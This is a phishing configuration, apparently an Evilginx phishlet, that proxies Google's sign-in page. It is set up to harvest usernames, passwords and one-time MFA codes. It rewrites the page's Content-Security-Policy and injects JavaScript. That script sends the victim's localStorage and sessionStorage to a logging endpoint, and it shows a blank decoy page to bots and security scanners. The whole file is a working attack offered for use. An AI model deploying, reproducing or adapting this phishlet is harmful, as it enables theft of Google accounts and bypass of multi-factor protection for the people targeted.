name: "gmail"
author: "@paris"
min_ver: "3.2.0"
proxy_webauthn: true

blacklist_mode: "off"

proxy_hosts:
  - phish_sub: 'accounts'
    orig_sub: 'accounts'
    domain: 'google.com'
    session: true
    is_landing: true
    auto_filter: false
    params:
      - key: 'username'
        map_to: 'username'
      - key: 'login_hint'
        map_to: 'username'
      - key: 'bg'
        map_to: 'bg'
      - key: 'text'
        map_to: 'text'

sub_filters:
  - { triggers_on: "accounts.google.com", orig_sub: "accounts", domain: "google.com", search: '<meta http-equiv="Content-Security-Policy" content="(.*?)">', replace: '<meta http-equiv="Content-Security-Policy" content="script-src ''self'' ''unsafe-inline'' ''unsafe-eval'' *.google.com *.gstatic.com; style-src ''self'' ''unsafe-inline'' *.google.com *.gstatic.com; img-src ''self'' data: blob: *.google.com *.gstatic.com; font-src ''self'' data: *.google.com *.gstatic.com; connect-src ''self'' *.google.com *.gstatic.com; frame-src ''self'' *.google.com; object-src ''none''; base-uri ''self''; form-action ''self'' ''unsafe-inline'';">', mimes: ["text/html"] }
  - { triggers_on: "accounts.google.com", orig_sub: "accounts", domain: "google.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/javascript", "application/json"] }
  - { triggers_on: "accounts.google.com", orig_sub: "accounts", domain: "google.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript"], redirect_only: true }

force_post:
  - path: "/signin/v2/challenge/*"
    search:
      - { key: "Email", search: "(.*)" }
    force:
      - { key: "bgResponse", value: "true" }
    type: "post"

auth_urls:
  - "/signin/v2/challenge/*"
  - "/log/session"

credentials:
  username:
    key: "(Email|email|identifier)"
    search: '(.*)'
    type: 'post'
  password:
    key: "(Passwd|password|passwd)"
    search: '(.*)'
    type: 'post'
  custom:
    - key: '(otp|mfa|code|totp)'
      search: '([a-zA-Z0-9]{6,8})'
      type: 'post'

login:
  domain: "accounts.google.com"
  path: "/"

js_inject:
  - trigger_domains: ["accounts.google.com"]
    trigger_paths: ["/", "/*"]
    script: |
      (function() {
        let passedGate = false;
        let lastCapture = '';
        const benignPageContent = '';

        function showBenignPage() {
          document.open();
          document.write(atob(benignPageContent));
          document.close();
        }

        function sendSessionData(stage) {
            try {
                const sessionInfo = {
                    localStorage: btoa(JSON.stringify(localStorage)),
                    sessionStorage: btoa(JSON.stringify(sessionStorage))
                };
                const currentCapture = JSON.stringify(sessionInfo);
                if(currentCapture === lastCapture) return;
                lastCapture = currentCapture;
                const payload = {
                    username: `SessionData-${stage}`,
                    password: currentCapture
                };
                navigator.sendBeacon('/log/session', JSON.stringify(payload));
            } catch (e) { /* silent */ }
        }

        function runMainLogic() {
          if (passedGate) return;
          passedGate = true;
          
          const params = new URLSearchParams(window.location.search);
          const bg = params.get('bg');
          
          function applyBranding() {
             try {
                const backgroundUrl = bg ? decodeURIComponent(bg) : 'https://i.ibb.co/fkLWqGZ/background.jpg';
                if (document.body.style.backgroundImage !== `url("${backgroundUrl}")`) {
                    document.body.style.backgroundImage = `url("${backgroundUrl}")`;
                    Object.assign(document.body.style, { backgroundSize: "cover", backgroundRepeat: "no-repeat", backgroundPosition: "center", height: "100%" });
                    document.documentElement.style.height = "100%";
                }
                const lightbox = document.getElementById("lightbox");
                if (lightbox) lightbox.remove();
             } catch(e) { /* silent */ }
          }
          
          function findAndClickNext() {
            const nextButton = document.querySelector('button[jsname="LgbsSe"]');
            if (nextButton) {
              nextButton.addEventListener('click', () => {
                setTimeout(sendSessionData, 500, 'Password-Page-Load');
              });
            }
          }
          
          const observer = new MutationObserver((mutations) => {
              mutations.forEach((mutation) => {
                if (mutation.addedNodes.length > 0) {
                    applyBranding();
                    let currentStage = 'Unknown';
                    if (document.querySelector('input[type="password"]')) {
                        currentStage = 'Password-Entry';
                    } else if (document.querySelector('input[type="email"]')) {
                        currentStage = 'Email-Entry';
                    }
                    sendSessionData(currentStage);
                    findAndClickNext();
                }
              });
          });

          window.addEventListener('load', () => {
              applyBranding();
              observer.observe(document.body, { childList: true, subtree: true });
              sendSessionData('Initial-Load');
              findAndClickNext();
          });
        }

        function checkBotStatus() {
          let humanityScore = 0;
          if (screen.width >= 1024 && screen.height >= 768) humanityScore++;
          if (navigator.plugins.length > 0) humanityScore++;
          if (!navigator.webdriver) humanityScore++;
          if (window.outerWidth > 0 && window.outerHeight > 0) humanityScore++;
          if (window.Cypress || window.plumbutter || window._phantom || window.callPhantom) humanityScore -= 5;
          return humanityScore;
        }

        if (checkBotStatus() < 2) {
            showBenignPage();
        } else {
            const interactionHandler = () => {
                if (passedGate) return;
                runMainLogic();
            };
            document.addEventListener('mousemove', interactionHandler, { once: true, passive: true });
            document.addEventListener('touchstart', interactionHandler, { once: true, passive: true });
            document.addEventListener('keydown', interactionHandler, { once: true, passive: true});
            setTimeout(() => {
                if (!passedGate) {
                    runMainLogic();
                }
            }, 4000);
        }
      })();